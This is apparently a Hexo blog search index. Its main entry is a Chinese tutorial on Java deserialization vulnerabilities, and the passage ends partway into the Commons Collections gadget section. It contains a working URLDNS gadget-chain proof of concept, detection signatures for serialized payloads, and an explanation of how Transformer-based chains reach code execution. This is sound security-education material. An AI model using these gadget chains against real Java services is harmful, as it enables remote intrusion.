<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2024-21762分析</title>
    <url>/2024/11/08/CVE-2024-21762/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3e963995a28f81f405f70303d4beaa58f8a4ac7f3114fa9efad6d05b5033d31d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
  </entry>
  <entry>
    <title>Java反序列化</title>
    <url>/2024/11/08/java-serialization/</url>
    <content><![CDATA[<h1 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h1><p>Java 的序列化（Serialization）和反序列化（Deserialization）是将对象的状态转换为字节流并恢复的过程。这个过程使对象可以保存到文件、通过网络传输或保存到数据库中，并在稍后恢复成对象。</p>
<ul>
<li><strong>序列化（Serialization）</strong>：将 Java 对象的状态转换为字节流的过程。这使得对象可以保存到文件、发送到其他 JVM 甚至通过网络传输。</li>
<li><strong>反序列化（Deserialization）</strong>：将字节流转换回 Java 对象的过程。这允许恢复先前序列化的对象状态。</li>
</ul>
<h2 id="序列化条件"><a href="#序列化条件" class="headerlink" title="序列化条件"></a>序列化条件</h2><p>要使 Java 对象可序列化，类必须实现 <code>java.io.Serializable</code> 接口。<strong>这个接口是一个标记接口（没有方法），它表明该类的对象可以被序列化</strong>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>; <span class="comment">// 用于版本控制</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructors, getters, and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>serialVersionUID</strong>：每个可序列化类建议定义一个 <code>serialVersionUID</code> 字段，用于版本控制。不同的 <code>serialVersionUID</code> 表示类的不同版本，如果序列化和反序列化的版本不匹配会抛出 <code>InvalidClassException</code>。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure></div></li>
<li><strong>transient 关键字</strong>：声明为 <code>transient</code> 的字段不会被序列化。它用于避免序列化敏感信息或不需要保存的字段。这种字段反序列化后为默认值（如 <code>null</code>）。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> String password; <span class="comment">// 密码不会被序列化</span></span><br></pre></td></tr></table></figure></div></li>
<li><strong>静态字段</strong>：静态字段属于类，而不是实例，因此不会被序列化。</li>
<li><strong>对象图的完整性</strong>：序列化对象时，会递归地序列化其引用的所有对象。因此，引用对象也必须是可序列化的，否则会抛出 <code>NotSerializableException</code>。</li>
</ul>
<h2 id="序列化接口"><a href="#序列化接口" class="headerlink" title="序列化接口"></a>序列化接口</h2><h3 id="序列化基本用法"><a href="#序列化基本用法" class="headerlink" title="序列化基本用法"></a>序列化基本用法</h3><ul>
<li><strong>序列化对象</strong>：使用 <code>ObjectOutputStream</code> 将对象写入（<code>writeObject</code> 方法）到输出流（如文件输出流）。  <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashMap);</span><br></pre></td></tr></table></figure></div></li>
<li><strong>反序列化对象</strong>：使用 <code>ObjectInputStream</code> 从输入流（如文件输入流）读取（<code>readObject</code> 方法）对象。  <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">hashMap = (HashMap)objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="自定义序列化"><a href="#自定义序列化" class="headerlink" title="自定义序列化"></a>自定义序列化</h3><ul>
<li><p><strong>自定义序列化</strong>：通过实现 <code>writeObject</code> 和 <code>readObject</code> 方法，可以自定义序列化和反序列化的行为。<strong>通常精心构造的序列化对象和 readObject 的自定义操作结合就可以造成反序列化漏洞。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    out.defaultWriteObject(); <span class="comment">// 默认序列化</span></span><br><span class="line">    <span class="comment">// 额外的序列化逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject(); <span class="comment">// 默认反序列化</span></span><br><span class="line">    <span class="comment">// 额外的反序列化逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>Externalizable 接口</strong>：<code>Externalizable</code> 是 <code>Serializable</code> 的子接口，它强制实现 <code>writeExternal</code> 和 <code>readExternal</code> 方法，提供完全控制序列化过程的能力。这对性能优化或定制序列化格式非常有用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参数构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="反序列化功能特征"><a href="#反序列化功能特征" class="headerlink" title="反序列化功能特征"></a>反序列化功能特征</h2><h3 id="压缩特征（压缩后一些数据格式改变）"><a href="#压缩特征（压缩后一些数据格式改变）" class="headerlink" title="压缩特征（压缩后一些数据格式改变）"></a>压缩特征（压缩后一些数据格式改变）</h3><ul>
<li>zip 格式特征：<code>PK*</code></li>
<li>zip+base64：<code>UE*</code></li>
<li>gzip+base64：<code>H4s*</code></li>
</ul>
<h3 id="反序列化数据特征-数据内容-请求类型"><a href="#反序列化数据特征-数据内容-请求类型" class="headerlink" title="反序列化数据特征(数据内容+请求类型)"></a>反序列化数据特征(数据内容+请求类型)</h3><ul>
<li><code>AC ED 00 05</code> in Hex</li>
<li><code>rO0</code> in Base64</li>
<li><code>Content-type = ‘application/x-java-serialized-object</code></li>
</ul>
<h2 id="反序列化利用（URLDNS-为例）"><a href="#反序列化利用（URLDNS-为例）" class="headerlink" title="反序列化利用（URLDNS 为例）"></a>反序列化利用（URLDNS 为例）</h2><p>URLDNS 反序列化利用链可以通过 DNS 请求来验证反序列化漏洞的可利用性。这条利用链使用 Java 内置的类构造，对第三方库没有依赖，可以在没有回显的情况下验证是否存在反序列化漏洞。我们可以在 <a class="link"   href="https://requestrepo.com/" >https://requestrepo.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 网站上进行 DNS 请求测试。</p>
<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://www.example.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, <span class="number">0xdeadbeef</span>); <span class="comment">// 防止提前触发影响观察现象</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line">        setFieldValue(url, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">getHostAddress:436, URLStreamHandler (java.net)</span><br><span class="line">hashCode:353, URLStreamHandler (java.net)</span><br><span class="line">hashCode:878, URL (java.net)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br></pre></td></tr></table></figure></div>
<p>首先在 <code>HashMap.readObject</code> 中会遍历 <code>HashMap</code> 的成员并对 <code>key</code> 调用 <code>HashMap.hash</code> 函数计算 hash。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">    	...</span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);	<span class="comment">//	&lt;-- 调用 hash 函数</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>HashMap.hash</code> 函数中会调用 <code>key</code> 的 <code>hashCode</code> 方法，也就是 <code>URL.hashCode</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>URL.hashCode</code> 函数中，由于我们设置 <code>url</code> 对象的 <code>hashCode</code> 成员值为 -1，因此会调用 <code>URLStreamHandler.hashCode</code> 函数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>URLStreamHandler.hashCode</code> 函数会调用 <code>getHostAddress</code> 函数获取 URL 对应的  ip 地址，也就会发送 DNS 请求。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="CommonCollections-系列"><a href="#CommonCollections-系列" class="headerlink" title="CommonCollections 系列"></a>CommonCollections 系列</h1><h2 id="Commons-Collections-概述"><a href="#Commons-Collections-概述" class="headerlink" title="Commons Collections 概述"></a>Commons Collections 概述</h2><p>Apache Commons Collections 是⼀个著名的辅助开发库，包含了一些 Java 中没有的数据结构和和辅助方法，不过随着 Java 9 以后的版本中原生库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
<p>在 2015 年底 commons-collections 反序列化利用链被提出时，Apache Commons Collections 有以下两个分支版本：</p>
<ul>
<li><code>commons-collections:commons-collections</code></li>
<li><code>org.apache.commons:commons-collections4</code></li>
</ul>
<p>前者是 Commons Collections 老的版本包，当时版本号是 3.2.1；后者是官方在 2013 年推出的 4 版本，当时版本号是 4.0。</p>
<p>因为官方认为旧的 commons-collections 有⼀些架构和 API 设计上的问题，但修复这些问题，会产生大量不能向前兼容的改动。所以，commons-collections4 不再认为是一个用来替换 commons-collections 的新版本，而是一个新的包，两者的命名空间不冲突，因此可以共存在同一个项目中。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons/collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons/collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><code>Transformer</code> 是一个接口，具体代码如下，可以看到这个接口只有一个 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>Transformer</code> 可以说是 CC 链的核心，<del>几乎</del>所有的 CC 链都依赖于 <code>Transformer</code>。我们可以简单的把 CC 链总结为：</p>
<ul>
<li>先寻找一个类，这个类自定义的 <code>readObject</code> 方法会直接或间接的触发<strong>对指定 <code>Transformer</code> 对象调用 <code>transform</code> 方法</strong>的代码。</li>
<li>由于我们可以用一系列 <code>Transformer</code> 接口实现类实现代码执行流的完全控制，因此当调用 <code>transform</code> 方法的时候，就可以执行我们的恶意代码。</li>
</ul>
<h3 id="调用-transform-方法的对象"><a href="#调用-transform-方法的对象" class="headerlink" title="调用 transform 方法的对象"></a>调用 transform 方法的对象</h3><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p><code>TransformedMap</code> 用于对 Java 标准数据结构 Map 做一个修饰，被修饰过的 <code>Map</code> 在添加（写入操作）新的元素时，将可以执行一个回调。我们通过下面这行代码对 <code>innerMap</code> 进行修饰，传出的 <code>outerMap</code> 即是修饰后的 <code>Map</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,</span><br><span class="line">valueTransformer);</span><br></pre></td></tr></table></figure></div>
<p>被修饰后的 <code>outerMap</code> 在转换 <code>Map</code> 的新元素时，就会调用 <code>transform</code> 方法，这个过程就类似在调用⼀个“回调函数”，这个回调的参数是原始对象。</p>
<p>例如 <code>TransformedMap.put</code> 方法：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外对 <code>TransformedMap</code> 内部成员调用 <code>setValue</code> 时也会调用 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>LazyMap</code> 和 <code>TransformedMap</code> 类似，都来自于 Common-Collections 库，并继承 <code>AbstractMapDecorator</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></div>
<p>在 Common-Collections4 中 <code>decorate</code> 方法改为 <code>lazyMap</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain)</span><br></pre></td></tr></table></figure></div>
<p><code>LazyMap</code> 的漏洞触发点和 <code>TransformedMap</code> 唯一的差别是，<code>TransformedMap</code> 是在写入元素的时候执行 <code>transform</code>，而 <code>LazyMap</code> 是在其 <code>get</code> 方法中执行的 <code>factory.transform</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意  <code>LazyMap</code> 是在其 <code>get</code> 方法中执行的 <code>factory.transform</code> 的条件是 <code>LazyMap</code> 没有当前查询的 <code>key</code>，也就是说对于一个特定的 <code>key</code>，我们只能调用一次 <code>transform</code> 。除非调用 <code>Map.clear</code> 方法清空 <code>LazyMap</code> 。</p>
<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code> 实现了 <code>java.util.Comparator</code> 接口，这个接口用于定义两个对象如何进行比较。对于一些需要维护顺序的数据结构（如 <code>java.util.PriorityQueue</code>），如果传入 <code>TransformingComparator</code> 用于两个对象的比较，那么比较两个对象的时候会调用 <code>TransformingComparator</code> 的 <code>compare</code> 方法。在 <code>compare</code> 方法内部会调用其中 <code>transformer</code> 成员的 <code>transform</code> 方法并传入进行比较的对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>TransformingComparator</code> 的构造函数如下，这里的 <code>transformer</code> 就是我们构造的 <code>Transformer</code> 结构，另外 <code>decorated</code> 如果不指定会传入 <code>new ComparableComparator()</code> 。</p>
